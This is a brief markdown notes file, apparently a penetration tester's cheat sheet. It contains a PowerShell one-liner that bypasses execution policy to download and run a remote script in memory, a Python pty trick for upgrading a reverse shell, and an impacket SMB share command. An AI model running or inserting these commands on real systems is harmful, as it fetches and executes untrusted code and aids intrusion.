# Notes
## PowerShell
### To load a PS module into the memory
```powershell
powershell.exe -exec bypass -Command “IEX (New-Object Net.WebClient).DownloadString($URL);
# Here call the modules you want to execute, depending on the usage of what you have downloaded
```
## Utils
## Shell to TTY
```bash
python -c "import pty;pty.spawn('/bin/bash')"
Ctrl + z
stty raw -echo
fg
```
## Sharing files with Windows machine
**NOTE:** This technique is usefull also to share files with any Windows VM *(or the parent host)* 
```bash
impacket-smbserver share <path> -smb2support
```
